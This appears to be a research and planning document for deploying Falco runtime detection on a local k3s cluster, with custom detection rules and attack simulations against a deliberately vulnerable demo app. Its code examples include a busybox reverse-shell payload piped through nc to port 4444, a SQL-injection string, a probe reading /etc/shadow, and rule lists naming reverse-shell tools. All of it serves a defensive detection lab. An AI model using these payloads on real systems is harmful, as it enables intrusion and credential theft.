# Phase 5: Runtime Security - Research

**Researched:** 2026-08-24
**Domain:** Falco 0.44.1 runtime threat detection on k3s / Rancher Desktop (Windows + WSL2), custom rule authoring, attack simulation
**Confidence:** HIGH on chart keys / driver / field availability (verified against `falco-9.1.0` and `falcosidekick-0.12.0` chart sources 2026-08-24); MEDIUM on exact rule-firing behaviour (must be validated empirically on the WSL2 target)

## Summary

Phase 5 installs Falco 0.44.1 (Helm chart 9.1.0) as a DaemonSet using the `modern_ebpf` driver, adds 5 namespace-scoped custom detection rules for the `demoapp` container, and drives three attack scripts that must trigger named alerts within 30 seconds with events persisted to a host file.

Two roadmap assumptions are **factually wrong** and must be corrected in the plan:

1. **Falcosidekick has no "file output".** Verified against the falcosidekick 0.12.0 chart values, the master `config_example.yaml`, and the README output list — there is no local-file sink. Persistence to `logs/falco.log` must use **Falco core's own `file_output`** (`falco.file_output.enabled=true` + `falco.file_output.filename`), not Falcosidekick. Falcosidekick contributes only the **webui** (`falcosidekick.webui.enabled=true`).
2. **Volume keys are `mounts.volumes` / `mounts.volumeMounts`** in the Falco chart (not `extraVolumes`/`extraVolumeMounts`). The hostPath for `/var/log/falco/` is mounted on the **Falco DaemonSet**, not on Falcosidekick.

The third and highest execution risk is **BTF availability on the WSL2 kernel**: `modern_ebpf` (CO-RE) requires `/sys/kernel/btf/vmlinux` to exist inside the node. On Windows/WSL2 this depends on the WSL2 kernel build. If BTF is absent there is **no kmod fallback** (no kernel headers in the VM) — Falco will CrashLoop. This must be verified before anything else.

**Primary recommendation:** Install with `driver.kind=modern_ebpf` + `falco.json_output=true` + `falco.file_output` to a hostPath-mounted node dir; add `falcosidekick.enabled=true --set falcosidekick.webui.enabled=true` for the demo UI; load the 5 custom rules via the chart's `customRules` values key (a values file, not `--set`); scope every rule with a self-contained `in_demoapp` macro (`k8s.ns.name = "demoapp"`) layered with `container.image.repository`; make the reverse-shell demo depend on **process spawn** (which fires regardless of whether the socket connects), not on destination IP.

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| FALCO-01 | Falco 0.44.1 DaemonSet, `driver.kind=modern_ebpf` (explicit) | Helm command in Standard Stack; chart 9.1.0 → appVersion 0.44.1 confirmed; BTF pre-check documented |
| FALCO-02 | Falcosidekick file output (`/var/log/falco/events.log`) + webui | **Corrected:** file persistence via Falco core `file_output` + `mounts.volumes` hostPath; webui via `falcosidekick.webui.enabled` |
| FALCO-03 | 5 custom rules loaded from `falco/rules/` | Rule YAML drafted (Code Examples); loaded via `customRules` values key → `/etc/falco/rules.d` |
| FALCO-04 | All rules scoped by `k8s.ns.name = "demoapp"` | `k8s.ns.name` confirmed available from container labels without k8smeta plugin; `in_demoapp` macro pattern |
| FALCO-05 | `kubectl logs -f` shows structured JSON alerts in real time | `falco.json_output=true` + `tty=true`; verification commands in Testing Strategy |
| ATK-01 | `attacks/sqli.py` — SQLi against localhost, deterministic, idempotent | Targets `http://localhost:30080/sqli?user=`; app `/sqli` endpoint confirmed string-concatenated |
| ATK-02 | `attacks/reverse_shell.sh` — command injection → reverse shell; fires reverse-shell + shell-from-webapp | `/cmd` runs `child_process.exec` → `/bin/sh -c` (confirmed in server.js); busybox-safe payload documented |
| ATK-03 | `attacks/privilege_probe.sh` — `cat /etc/shadow`, `id`, `apk add`; fires sensitive-file + package-management | `kubectl exec` (non-interactive) pattern; alpine busybox constraints documented |
| ATK-04 | All scripts hard-code localhost/cluster + ethical safety comment/guard | Target-guard pattern documented |
</phase_requirements>

## Project Constraints (from CLAUDE.md)

- **Falco MUST use `driver.kind=modern_ebpf`** — Rancher Desktop VM has no kernel headers; kmod fails. (Locked decision, STATE.md.)
- **Stack pins:** Falco 0.44.1, Helm chart `falcosecurity/falco 9.1.0`. Do not upgrade.
- **Target machine is Windows + Rancher Desktop 1.23.1 (WSL2 backend, dockerd engine).** All Phase 5 execution (helm, kubectl, attack scripts) runs there. Dev machine (macOS) is code-authoring only.
- **Attack scripts MUST target localhost/cluster only** — ethical constraint; scripts must refuse to run against external targets (ATK-04).
- **All custom rules scoped to `k8s.ns.name = "demoapp"`** to prevent false positives from `kube-system`/`argocd`/`falco` namespaces (FALCO-04, Pitfall 6/7).
- **Jenkins MUST NOT `kubectl apply`** and image tags are git short SHA — unchanged in this phase but Falco must generate **zero** alerts during normal ArgoCD/Jenkins operation (success criterion 6).
- **RAM budget ~10 GB peak.** Never run a Jenkins build and the attack simulation concurrently (Pitfall 4). Falcosidekick + webui + redis add ~250–350 MB.

## Standard Stack

### Core
| Component | Version | Purpose | Why Standard |
|-----------|---------|---------|--------------|
| Falco | 0.44.1 | Syscall-level runtime detection | CNCF-graduated; chart 9.1.0 `appVersion` confirmed = 0.44.1 |
| falcosecurity/falco Helm chart | 9.1.0 | Install method | Pinned; bundles falcosidekick 0.12.* + k8s-metacollector 0.1.* + falco-talon 0.3.* subcharts (Chart.yaml verified) |
| Falcosidekick (subchart) | 0.12.* | Event fan-out + **webui only** | Bundled; provides the browser UI for the demo. **No file output exists.** |
| modern_ebpf driver | in-binary CO-RE probe | Instrumentation | Only viable driver on RD VM (no headers for kmod; legacy `ebpf` deprecated in 0.44.0) |

### Supporting (attack scripts)
| Tool | Purpose | When to Use |
|------|---------|-------------|
| Python 3 + `requests` (or `urllib`) | `attacks/sqli.py` | HTTP SQLi against NodePort 30080 |
| `curl` + `nc` (host) | `attacks/reverse_shell.sh` | Trigger `/cmd`, host listener |
| `kubectl exec` | `attacks/privilege_probe.sh` | In-container sensitive-file + package-mgmt probes |

### Installation
```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
# install command in "Code Examples" below (uses a values file, not long --set chains)
```

**Version verification (done 2026-08-24):** `falco-9.1.0` chart tag confirmed on `github.com/falcosecurity/charts`; `Chart.yaml` → `version: 9.1.0`, `appVersion: 0.44.1`, dependency `falcosidekick 0.12.*`. Re-run `helm search repo falcosecurity/falco --version 9.1.0` on the target before install.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| Helm | Falco install | assume ✓ (used Phase 3) | 3.x | — |
| kubectl | all tasks | ✓ (RD) | — | — |
| k3s / Rancher Desktop | runtime | ✓ | 1.23.1 / k3s v1.32.x | — |
| **WSL2 kernel BTF** (`/sys/kernel/btf/vmlinux`) | `modern_ebpf` | **VERIFY FIRST** | needs kernel ≥5.8 + `CONFIG_DEBUG_INFO_BTF` | `wsl --update`; last resort BTFhub (no kmod fallback) |
| Internet (ghcr.io) at Falco init | falcoctl downloading base ruleset (`spawned_process`, `open_read` macros) | verify | — | Make custom rules self-contained; pre-cache artifact |
| ghcr.io k8smeta plugin image `0.4.1` | `collectors.kubernetes.enabled=true` | verify | 0.4.1 | Leave collector disabled — `k8s.ns.name` still works from container labels |
| Python 3 on target | `attacks/sqli.py` | verify (Git Bash/WSL) | 3.x | Use `curl` in a `.sh` instead |

**Missing dependencies with no fallback:**
- WSL2 BTF: if `/sys/kernel/btf/vmlinux` is absent AND `wsl --update` cannot enable it, `modern_ebpf` cannot start and there is no kmod path on RD. This blocks the entire phase — verify on day 1.

**Missing dependencies with fallback:**
- k8smeta plugin / `collectors.kubernetes`: optional. `k8s.ns.name` is populated from container-runtime labels without it.
- ghcr.io ruleset at init: make custom rules self-contained to avoid depending on downloaded base macros.

## Architecture Patterns

### File layout (this phase)
```
falco/
├── values.yaml            # Helm values: driver, file_output, mounts, falcosidekick, customRules
└── rules/
    └── custom-rules.yaml  # 5 rules (source-of-truth; also inlined into values customRules)
attacks/
├── sqli.py                # ATK-01
├── reverse_shell.sh       # ATK-02
└── privilege_probe.sh     # ATK-03
logs/
└── falco.log              # copied out of the node (gitignored except .gitkeep)
```

### Pattern 1: Persistence via Falco core `file_output` + node hostPath (NOT Falcosidekick)
**What:** Falco writes each alert as a JSON line to a file on the node; the node dir is a `hostPath` so it survives pod restarts.
**Why:** Falcosidekick has no file sink (verified). Falco core does.
**Keys (chart 9.1.0, verified):**
```yaml
falco:
  json_output: true          # default false — REQUIRED for FALCO-05 structured JSON
  file_output:
    enabled: true            # default false
    keep_alive: false
    filename: /var/log/falco/events.log   # default ./events.txt
mounts:                       # NOT extraVolumes/extraVolumeMounts
  volumes:
    - name: falco-logs
      hostPath:
        path: /var/log/falco
        type: DirectoryOrCreate
  volumeMounts:
    - name: falco-logs
      mountPath: /var/log/falco
```

### Pattern 2: Namespace scoping with a self-contained macro
**What:** Define `in_demoapp` once, reference it in all 5 rules. Layer an image match for robustness.
**Why:** `k8s.ns.name` is extracted from container-runtime labels and is marked *deprecated* with a documented lookup-delay caveat ("may not be available yet" for very short-lived procs). `container.image.repository` has no such caveat.
```yaml
- macro: in_demoapp
  condition: (k8s.ns.name = "demoapp" or container.image.repository endswith "/demoapp")
```

### Pattern 3: Load custom rules via the chart `customRules` key
**What:** `customRules` is a map `filename → content`; the chart renders a ConfigMap mounted at `/etc/falco/rules.d`, which is already in `falco.rules_files`.
**How (recommended — values file):**
```yaml
customRules:
  custom-rules.yaml: |-
    - macro: in_demoapp
      condition: (k8s.ns.name = "demoapp" or container.image.repository endswith "/demoapp")
    # ...rest of rules...
```
Keep `falco/rules/custom-rules.yaml` as the human-editable source of truth and inline it into `falco/values.yaml`. Alternatively `--set-file customRules."custom-rules\.yaml"=falco/rules/custom-rules.yaml`.

### Anti-Patterns to Avoid
- **Editing `falco_rules.yaml` directly** — overwritten on upgrade / re-downloaded by falcoctl. Use `customRules` → `rules.d`.
- **`proc.name`-only rules** — any renamed binary evades, any legit use fires (Pitfall 6). Always layer conditions + namespace scope.
- **Assuming Falcosidekick persists to file** — it does not. Use Falco core `file_output`.
- **`fd.sip != "127.0.0.1"` on the reverse-shell rule** — the attack targets localhost:4444, so this exclusion would *suppress* the very alert you want (see Open Questions #1).

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Namespace/pod enrichment | Custom sidecar to tag events | Falco `k8s.*` fields (container labels) | Built-in, zero extra pods |
| Reverse-shell / shell-spawn detection macros | Novel conditions from scratch | Falco base macros `spawned_process`, `open_read`, `container`, list `shell_binaries` | Battle-tested; only extend/scope them |
| Package-manager process set | Enumerate every binary | Base list `package_mgmt_binaries` / `package_mgmt_procs` | Maintained upstream |
| Alert persistence | Log-scraping cron | Falco core `file_output` | First-class, JSON, restart-safe via hostPath |
| Demo UI | Custom dashboard | `falcosidekick.webui` | Bundled in chart |

**Key insight:** Reference the base ruleset macros rather than reinventing them — **but** that requires the falcoctl-downloaded `falco_rules.yaml` to be present (needs ghcr.io at init). If offline is a risk, make the custom file self-contained (define your own tiny macros / raw `evt.type` conditions). See Pitfall 4.

## Common Pitfalls

### Pitfall 1: BTF missing on WSL2 → modern_ebpf CrashLoop (no fallback)
**What goes wrong:** `modern_ebpf` needs `/sys/kernel/btf/vmlinux`. Older WSL2 kernels shipped without `CONFIG_DEBUG_INFO_BTF`. If absent, Falco crashes and there is no kmod path (no headers).
**How to avoid:** Before install, from the node/VM: `ls -l /sys/kernel/btf/vmlinux` and `uname -r` (≥5.8). If missing, `wsl --update` (newer MS kernels enable BTF), then re-check. This is the day-1 gate.
**Warning signs:** `CrashLoopBackOff`; logs mention "failed to open BPF probe" / "unable to find BTF".

### Pitfall 2: Custom rules reference base macros that never loaded
**What goes wrong:** Rules using `spawned_process`/`open_read` fail with "unknown macro" if falcoctl couldn't download the base ruleset (no internet at init, or `falcoctl.artifact.install` disabled).
**How to avoid:** Confirm startup logs show base rules loaded; OR make `custom-rules.yaml` self-contained. Validate with `kubectl logs` for "Loading rules" / "Rule ... loaded" and zero "Error" lines.
**Warning signs:** Falco starts but 0 custom rules load; "unknown macro/list" parse errors.

### Pitfall 3: Reverse-shell rule excludes the loopback target it's demoing
**What goes wrong:** Roadmap task 3 suggests `fd.sip != "127.0.0.1"`, but task 6 opens the shell to `localhost:4444` → rule never fires. Also the app container is `node:14-alpine` (busybox): **no bash**, so `/dev/tcp` and `bash -i` do not exist, and busybox `nc` is usually built **without `-e`**.
**How to avoid:** (a) Detect on **process spawn** (`nc`/`socat` execve, or `sh` child of `node`) — fires even if the socket never connects. (b) Use a busybox-safe mkfifo payload. (c) Point the listener at the host's non-loopback address if you insist on an `fd.sip` condition; otherwise drop the loopback exclusion.

### Pitfall 4: hostPath lands inside the WSL2 VM, not the Windows repo
**What goes wrong:** A `hostPath: /var/log/falco` is on the **k3s node filesystem = the rancher-desktop WSL2 distro**, not `C:\...\myProject\logs`. `logs/falco.log` in the repo won't auto-populate.
**How to avoid:** Copy it out for viewing: `wsl -d rancher-desktop cat /var/log/falco/events.log > logs/falco.log`, or read `\\wsl$\rancher-desktop\var\log\falco\events.log`. Persistence (success criterion 5) is proven by the node hostPath surviving pod restart; the repo copy is a convenience step. (Optionally test a hostPath into a `/mnt/<drive>/...` Windows-mounted path, but verify empirically that RD's k3s distro mounts Windows drives before relying on it.)
**Warning signs:** Empty `logs/falco.log` despite alerts visible in `kubectl logs`.

### Pitfall 5: Falco alerts fire during normal operations (namespace scope failure)
**What goes wrong:** Rules without namespace scope fire on `kube-system`, `argocd`, Falco's own exec probes → success criterion 6 fails.
**How to avoid:** `in_demoapp` on every rule; validate by tailing `kubectl logs -f` through a full Jenkins→ArgoCD cycle and observing zero alerts.

### Pitfall 6: Falcosidekick service name is release-prefixed
**What goes wrong:** `kubectl port-forward svc/falcosidekick-ui` fails — with `helm install falco ...`, the subchart service is `falco-falcosidekick-ui`.
**How to avoid:** `kubectl get svc -n falco` first. Expect `falco-falcosidekick` (2801) and `falco-falcosidekick-ui` (2802). Webui also needs its bundled redis running.

### Pitfall 7: `kubectl exec` tty and self-triggered alerts (Pitfall 19)
**What goes wrong:** Interactive debugging (`kubectl exec -it`) trips rules during the demo.
**How to avoid:** Run `attacks/privilege_probe.sh` with `kubectl exec` **without `-it`** (tty=0) so it fires as an attack; if you want interactive debug sessions excluded, add `and proc.tty = 0` to the in-container rules. Do not blanket-exclude, or the scripted probe stops firing.

## Falco Field Reference (verified against Falco supported-fields docs, 2026-08-24)

| Field | Meaning | Plugin required? |
|-------|---------|------------------|
| `k8s.ns.name` | Pod namespace, from container-runtime socket labels | **No** — works without k8smeta; marked deprecated; lookup-delay caveat |
| `k8s.pod.name` | Pod name, same source | No (same caveat) |
| `container.image.repository` | Image repo (no tag) | No — most robust scoping key |
| `proc.name` | Process comm (≤16 chars) | No |
| `proc.pname` | Parent process name | No |
| `proc.cmdline` | `proc.name` + args (≤4096b) | No |
| `proc.tty` | Controlling terminal (0 = none) | No |
| `fd.sip` | Server (remote) IP | No |
| `fd.sport` | Server (remote) port | No |
| `fd.type` | `file`/`ipv4`/`ipv6`/`unix`/`pipe`/… | No |
| `fd.name` | Full path / connection string | No |
| `k8smeta.ns.name` | Non-deprecated namespace field | **Yes** — needs `collectors.kubernetes.enabled=true` |

**Answer to output Q9:** `k8s.ns.name` does **not** require `collectors.kubernetes.enabled=true`; it comes from container labels. Enabling the collector adds richer, non-deprecated `k8smeta.*` fields plus a metacollector pod + a ghcr.io plugin image dependency. For a RAM-constrained thesis demo it is **optional**; keep it enabled only if you want the richer metadata and have reliable ghcr.io access. Rules should keep using `k8s.ns.name` (works either way).

## Code Examples

### Helm install (values-file approach)
`falco/values.yaml`:
```yaml
# Source: falcosecurity/charts falco-9.1.0/values.yaml (verified 2026-08-24)
driver:
  kind: modern_ebpf          # explicit; never rely on auto (FALCO-01)
tty: true                    # live flush for kubectl logs -f (FALCO-05)

falco:
  json_output: true          # structured JSON alerts (FALCO-05); default false
  file_output:
    enabled: true
    keep_alive: false
    filename: /var/log/falco/events.log
  # rules_files default already includes /etc/falco/rules.d

mounts:
  volumes:
    - name: falco-logs
      hostPath:
        path: /var/log/falco
        type: DirectoryOrCreate
  volumeMounts:
    - name: falco-logs
      mountPath: /var/log/falco

collectors:
  kubernetes:
    enabled: true            # optional; see Q9. Set false to drop a pod + ghcr dependency.

falcosidekick:
  enabled: true
  webui:
    enabled: true            # key is webui.enabled (NOT webui.create) — verified

customRules:
  custom-rules.yaml: |-
    # inline the contents of falco/rules/custom-rules.yaml here
```
Install:
```bash
helm install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --version 9.1.0 \
  -f falco/values.yaml
```

### `falco/rules/custom-rules.yaml` (starting point — validate firing empirically, MEDIUM confidence)
```yaml
# Scope: only the vulnerable demo app. Self-contained where practical.
- macro: in_demoapp
  condition: (k8s.ns.name = "demoapp" or container.image.repository endswith "/demoapp")

- list: reverse_shell_tools
  items: [nc, ncat, netcat, socat, nmap]
- list: local_shells
  items: [sh, bash, ash, dash, busybox]
- list: web_runtimes
  items: [node, nodejs, python, python3]
- list: demo_sensitive_files
  items: [/etc/shadow, /etc/sudoers]
- list: pkg_mgmt
  items: [apk, apt, apt-get, dpkg, npm, pip, pip3, yum, dnf]

# 1a. reverse-shell: network tool spawned (fires on execve, no connection needed)
- rule: Reverse Shell Tool in demoapp
  desc: Netcat/socat-style tool launched inside the demo app container
  condition: spawned_process and in_demoapp and proc.name in (reverse_shell_tools)
  output: "Reverse-shell tool in demoapp (cmd=%proc.cmdline parent=%proc.pname ns=%k8s.ns.name pod=%k8s.pod.name)"
  priority: CRITICAL
  tags: [demo, T1059]

# 1b. reverse-shell: stdio duped onto a network socket (classic pattern)
- rule: Stdio to Network in demoapp
  desc: A process redirected stdin/stdout/stderr to a network socket
  condition: >
    in_demoapp and evt.type in (dup, dup2, dup3)
    and fd.num in (0,1,2) and fd.type in (ipv4, ipv6)
  output: "Stdio redirected to network in demoapp (conn=%fd.name cmd=%proc.cmdline ns=%k8s.ns.name)"
  priority: CRITICAL
  tags: [demo, T1059]

# 2. shell-from-webapp: sh/bash child of node/python (command injection)
- rule: Shell Spawned by Web App in demoapp
  desc: Shell spawned as a child of the Node.js/Python web process
  condition: >
    spawned_process and in_demoapp
    and proc.name in (local_shells) and proc.pname in (web_runtimes)
  output: "Shell spawned by web runtime (shell=%proc.name parent=%proc.pname cmd=%proc.cmdline ns=%k8s.ns.name)"
  priority: CRITICAL
  tags: [demo, T1059]

# 3. read-sensitive-file
- rule: Read Sensitive File in demoapp
  desc: Credential/sensitive file opened in the demo app
  condition: >
    open_read and in_demoapp
    and (fd.name in (demo_sensitive_files) or fd.name startswith /etc/sudoers.d or fd.name contains ".ssh/")
  output: "Sensitive file opened in demoapp (file=%fd.name proc=%proc.cmdline ns=%k8s.ns.name)"
  priority: WARNING
  tags: [demo, T1552]

# 4. package-management-in-container
- rule: Package Management in demoapp
  desc: Package manager executed at runtime
  condition: spawned_process and in_demoapp and proc.name in (pkg_mgmt)
  output: "Package management in demoapp (cmd=%proc.cmdline ns=%k8s.ns.name)"
  priority: WARNING
  tags: [demo, T1072]

# 5. contact-k8s-api  (verify ClusterIP: kubectl get svc kubernetes -n default -o jsonpath='{.spec.clusterIP}')
- macro: demo_outbound
  condition: (evt.type = connect and evt.dir = < and fd.type in (ipv4))
- rule: Contact K8s API Server from demoapp
  desc: demoapp pod connected to the Kubernetes API server
  condition: demo_outbound and in_demoapp and (fd.sip = "10.43.0.1" or fd.sport in (443, 6443))
  output: "demoapp contacted K8s API (conn=%fd.name proc=%proc.cmdline ns=%k8s.ns.name)"
  priority: NOTICE
  tags: [demo, T1613]
```

### Attack triggers matched to the confirmed app (`server.js`)
```bash
# ATK-01  sqli.py  — /sqli?user= is raw string concatenation (confirmed)
#   GET http://localhost:30080/sqli?user=' OR '1'='1   (URL-encoded)
#   Deterministic: assert HTTP 200 with results OR 500 with SQL error (both prove injection).

# ATK-02  reverse_shell.sh — /cmd runs child_process.exec => /bin/sh -c "<input>" (confirmed).
#   busybox-safe payload (no bash, no nc -e):
#   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <HOST> 4444 > /tmp/f
#   URL-encode and hit http://localhost:30080/cmd?input=<encoded>
#   Fires "Shell Spawned by Web App" (sh child of node) AND "Reverse Shell Tool" (nc execve)
#   — both fire on process spawn, so the demo is robust even if the socket never connects.

# ATK-03  privilege_probe.sh — NON-interactive exec so tty=0 (fires as attack):
#   kubectl exec -n demoapp deploy/demoapp -- sh -c 'cat /etc/shadow; id; whoami; apk add curl'
#   Fires "Read Sensitive File" (/etc/shadow) and "Package Management" (apk).

# ATK-04  ethical guard (top of each script):
#   case "$TARGET" in localhost|127.0.0.1|host.rancher-desktop.internal|10.43.*) ;; \
#     *) echo "Refusing non-local target"; exit 1;; esac
```

## Validation Architecture

nyquist_validation is enabled. This project has **no unit-test framework**; validation is shell/kubectl assertion scripts (consistent with Phase 4's `scenario-*.sh` / `verify.sh`). All Phase-5 execution is on the Windows/WSL2 target.

### Test "Framework"
| Property | Value |
|----------|-------|
| Framework | Bash verification scripts + `kubectl` assertions (no pytest/jest) |
| Config file | none — see Wave 0 |
| Quick run command | `bash falco/verify-rules-loaded.sh` (greps Falco startup logs) |
| Full suite command | `bash falco/verify-phase5.sh` (install check + 3 attacks + alert assertions + persistence) |

### Phase Requirements → Test Map
| Req | Behavior | Test Type | Automated Command | File Exists? |
|-----|----------|-----------|-------------------|-------------|
| FALCO-01 | Pod Running, driver=modern_ebpf | smoke | `kubectl get pod -n falco -l app.kubernetes.io/name=falco` + `kubectl logs ... | grep -E "modern_ebpf|Falco initialized"` | ❌ Wave 0 |
| FALCO-02 | Webui reachable + file persists | integration | port-forward `svc/falco-falcosidekick-ui 2802` + `wsl -d rancher-desktop test -s /var/log/falco/events.log` | ❌ Wave 0 |
| FALCO-03 | 5 rules load, no parse errors | smoke | `kubectl logs ... -n falco | grep -c "Loading rules"` + assert 0 "Error"/"unknown macro" | ❌ Wave 0 |
| FALCO-04 | Zero alerts in normal ops | integration | tail `kubectl logs -f` through a Jenkins→ArgoCD cycle, assert 0 demo-tagged alerts | ❌ Wave 0 |
| FALCO-05 | JSON alerts in real time | smoke | run one attack, assert JSON line appears in `kubectl logs -f` <30s | ❌ Wave 0 |
| ATK-01 | SQLi extracts/errors deterministically | integration | `python attacks/sqli.py` exit 0 | ❌ Wave 0 |
| ATK-02 | reverse-shell + shell-from-webapp fire | integration | run script, grep webui/log for both rule names <30s | ❌ Wave 0 |
| ATK-03 | sensitive-file + package-mgmt fire | integration | run script, grep for both rule names <30s | ❌ Wave 0 |
| ATK-04 | Scripts refuse external targets | unit | invoke with a non-local target, assert exit 1 | ❌ Wave 0 |

### Sampling Rate
- **Per task commit:** `verify-rules-loaded.sh` (rules parse + pod healthy).
- **Per wave merge:** run the relevant attack script + assert its named alert within 30s.
- **Phase gate:** `verify-phase5.sh` green (all 5 rules, 3 attacks, persistence-after-restart, zero-alert-in-normal-ops) before `/gsd:verify-work`.

### Wave 0 Gaps
- [ ] `falco/verify-rules-loaded.sh` — greps startup logs for 5 rule names + zero parse errors (FALCO-03)
- [ ] `falco/verify-phase5.sh` — full suite: install/driver check, 3 attacks, alert-within-30s assertions, persistence-after-pod-restart, zero-alert-during-pipeline (FALCO-01/02/04/05, ATK-01..03)
- [ ] `attacks/` scripts double as the executable tests (each exits non-zero on failure)
- [ ] `logs/.gitkeep` + `.gitignore` entry for `logs/falco.log`
- [ ] No framework install needed (bash + kubectl already present)

## State of the Art

| Old Approach | Current Approach (Falco 0.44 / chart 9.x) | Impact |
|--------------|-------------------------------------------|--------|
| `driver.kind=ebpf` (legacy probe) | `modern_ebpf` (in-binary CO-RE) | Legacy eBPF + gRPC + gVisor deprecated in 0.44.0; use modern_ebpf |
| Base rules bundled in image | falcoctl downloads `falco-rules` artifact at init | Needs ghcr.io at first start; affects custom rules that reference base macros |
| `-k`/`-K` API-server k8s enrichment | container-label `k8s.*` (default) or `k8smeta` plugin | `k8s.ns.name` works without API access; `k8smeta.*` is the non-deprecated richer path |
| Falcosidekick "file" sink (never existed) | Falco core `file_output` | Persist via Falco, not Falcosidekick |

**Deprecated/outdated:** legacy `ebpf` driver; direct edits to `falco_rules.yaml`; assuming `extraVolumes` (chart uses `mounts.volumes`).

## Open Questions

1. **Reverse-shell rule vs loopback target (design conflict in roadmap tasks 3 & 6).**
   - Known: attack opens shell to `localhost:4444`; roadmap rule text excludes `fd.sip = 127.0.0.1`.
   - Unclear: whether the demo listener will be on loopback or the host's routable address.
   - Recommendation: detect on **process spawn** (nc execve + sh-child-of-node), drop the loopback exclusion. Resolved in the rule set above.

2. **OQ6 — does `driver.kind=auto` pick modern_ebpf first?** Chart 9.1.0 default is `auto`. Regardless, pin `modern_ebpf` explicitly (locked decision). Do not spend time confirming auto behaviour — pinning makes it moot.

3. **OQ7 — Falcosidekick webui key.** RESOLVED: it is `webui.enabled` (verified against falcosidekick-0.12.0 values). Under the parent chart: `falcosidekick.webui.enabled=true`.

4. **k3s kubernetes ClusterIP for `contact-k8s-api`.** Assumed `10.43.0.1` (k3s default service CIDR). Verify: `kubectl get svc kubernetes -n default -o jsonpath='{.spec.clusterIP}'`. Confidence MEDIUM.

5. **falcoctl base-ruleset availability offline.** If the demo machine is offline at Falco init, base macros may be missing. Decide: ensure internet at install, or ship self-contained rules. Confidence MEDIUM.

6. **Windows-drive hostPath.** Whether RD's k3s WSL2 distro mounts `/mnt/<drive>` (which would let hostPath write straight into the repo). Verify empirically; otherwise use the `wsl ... cat > logs/falco.log` copy-out. Confidence LOW.

## Sources

### Primary (HIGH confidence)
- Falco chart `falco-9.1.0` `values.yaml` — driver.kind, customRules, collectors.kubernetes, tty, falco.file_output, falco.json_output, mounts.volumes/volumeMounts (fetched 2026-08-24)
- Falco chart `falco-9.1.0` `Chart.yaml` — version 9.1.0, appVersion 0.44.1, deps falcosidekick 0.12.*, k8s-metacollector 0.1.*, falco-talon 0.3.*
- Falcosidekick chart `falcosidekick-0.12.0` `values.yaml` — `webui.enabled` (not `webui.create`); `extraVolumes`/`extraVolumeMounts`; **no file output**
- Falcosidekick `README.md` + `config_example.yaml` (master) — output list confirms **no local File sink**
- Falco docs `reference/rules/supported-fields` — k8s.*/fd.*/proc.* field semantics + plugin requirements
- Local repo: `app/server.js` (`/sqli` string-concat, `/cmd` child_process.exec), `app/Dockerfile` (`node:14.21.3-alpine`, busybox), `deploy/base/*` (ns `demoapp`, NodePort 30080, container `demoapp`)

### Secondary (MEDIUM confidence)
- Falco rule-syntax knowledge (macros/lists/exceptions, base macros `spawned_process`/`open_read`) — training data; validate against the falcoctl-downloaded `falco_rules.yaml` on target
- WSL2 BTF availability trend — general knowledge; must be checked with `ls /sys/kernel/btf/vmlinux`

### Tertiary (LOW confidence)
- RD WSL2 distro mounting Windows drives into k3s node — unverified, empirical check required
- k3s kubernetes ClusterIP = 10.43.0.1 — default CIDR assumption, verify on target

## Metadata

**Confidence breakdown:**
- Chart keys / driver / falcosidekick webui / file_output / mounts: HIGH — verified against pinned chart sources today
- Field availability (`k8s.ns.name` without plugin): HIGH — Falco docs
- Custom rule firing behaviour: MEDIUM — syntax sound, real firing must be tested on target (busybox + WSL2 specifics)
- WSL2 BTF / hostPath location / ClusterIP: MEDIUM-LOW — environment-dependent, empirical checks listed

**Research date:** 2026-08-24
**Valid until:** ~2026-09-23 (30 days; stack is version-pinned so drift risk is low)

## RESEARCH COMPLETE
